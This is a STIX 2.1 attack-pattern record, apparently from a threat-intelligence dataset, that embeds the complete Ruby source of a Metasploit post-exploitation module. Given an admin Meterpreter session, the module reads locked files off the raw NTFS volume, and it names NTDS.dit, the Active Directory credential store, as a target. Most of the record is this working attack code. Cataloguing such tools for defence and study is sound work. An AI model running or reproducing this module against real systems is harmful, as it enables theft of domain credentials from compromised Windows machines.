{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d7fbc7aa-ece4-4f38-a421-ef0a21d20ea7",
    "created": "2024-08-14T16:33:05.056706Z",
    "modified": "2024-08-14T16:33:05.05671Z",
    "name": "Windows File Gather File from Raw NTFS",
    "description": " This module gathers a file using the raw NTFS device, bypassing some Windows restrictions such as open file with write lock. Because it avoids the usual file locking issues, it can be used to retrieve files such as NTDS.dit.  'License' => 'MSF_LICENSE' 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/file_from_raw_ntfs.rb",
            "external_id": "file_from_raw_ntfs.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.amazon.com/System-Forensic-Analysis-Brian-Carrier/dp/0321268172/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Error\n\n  ERROR = Msf::Post::Windows::Error\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows File Gather File from Raw NTFS',\n        'Description' => %q{\n          This module gathers a file using the raw NTFS device, bypassing some Windows restrictions\n          such as open file with write lock. Because it avoids the usual file locking issues, it can\n          be used to retrieve files such as NTDS.dit.\n        },\n        'License' => 'MSF_LICENSE',\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => ['Danil Bazin <danil.bazin[at]hsc.fr>'], # @danilbaz\n        'References' => [\n          [ 'URL', 'http://www.amazon.com/System-Forensic-Analysis-Brian-Carrier/dp/0321268172/' ]\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('FILE_PATH', [true, 'The FILE_PATH to retreive from the Volume raw device', nil])\n      ]\n    )\n  end\n\n  def run\n    version = get_version_info\n\n    fail_with(Failure::NoTarget, 'Module not valid for Windows 2000') if version.build_number == Msf::WindowsVersion::Win2000\n    fail_with(Failure::NoAccess, 'You don\\'t have administrative privileges') unless is_admin?\n\n    file_path = datastore['FILE_PATH']\n\n    r = client.railgun.kernel32.GetFileAttributesW(file_path)\n\n    case r['GetLastError']\n    when ERROR::SUCCESS, ERROR::SHARING_VIOLATION, ERROR::ACCESS_DENIED, ERROR::LOCK_VIOLATION\n      # Continue, we can bypass these errors as we are performing a raw\n      # file read.\n    when ERROR::FILE_NOT_FOUND, ERROR::PATH_NOT_FOUND\n      fail_with(Failure::BadConfig, \"The file, #{file_path}, does not exist, use file format C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\drivers\\\\\\\\etc\\\\\\\\hosts\")\n    else\n      fail_with(Failure::Unknown, \"Unknown error locating #{file_path}. Windows Error Code: #{r['GetLastError']} - #{r['ErrorMessage']}\")\n    end\n\n    drive = file_path[0, 2]\n\n    r = client.railgun.kernel32.CreateFileW(\"\\\\\\\\.\\\\#{drive}\",\n                                            'GENERIC_READ',\n                                            'FILE_SHARE_DELETE|FILE_SHARE_READ|FILE_SHARE_WRITE',\n                                            nil,\n                                            'OPEN_EXISTING',\n                                            'FILE_FLAG_WRITE_THROUGH',\n                                            0)\n\n    if r['GetLastError'] != ERROR::SUCCESS\n      fail_with(Failure::Unknown, \"Error opening #{drive}. Windows Error Code: #{r['GetLastError']} - #{r['ErrorMessage']}\")\n    end\n\n    @handle = r['return']\n    vprint_good(\"Successfuly opened #{drive}\")\n    begin\n      @bytes_read = 0\n      fs = Rex::Parser::NTFS.new(self)\n      print_status(\"Trying to gather #{file_path}\")\n      path = file_path[3, file_path.length - 3]\n      data = fs.file(path)\n      file_name = file_path.split('\\\\')[-1]\n      stored_path = store_loot('windows.file', 'application/octet-stream', session, data, file_name, 'Windows file')\n      print_good(\"Saving file : #{stored_path}\")\n    ensure\n      client.railgun.kernel32.CloseHandle(@handle)\n    end\n    print_status('Post Successful')\n  end\n\n  def read(size)\n    vprint_status(\"Reading #{size} bytes\")\n    client.railgun.kernel32.ReadFile(@handle, size, size, 4, nil)['lpBuffer']\n  end\n\n  def seek(offset)\n    vprint_status(\"Seeking to offset #{offset}\")\n    high_offset = offset >> 32\n    low_offset = offset & (2**33 - 1)\n    client.railgun.kernel32.SetFilePointer(@handle, low_offset, high_offset, 0)\n  end\nend\n"
}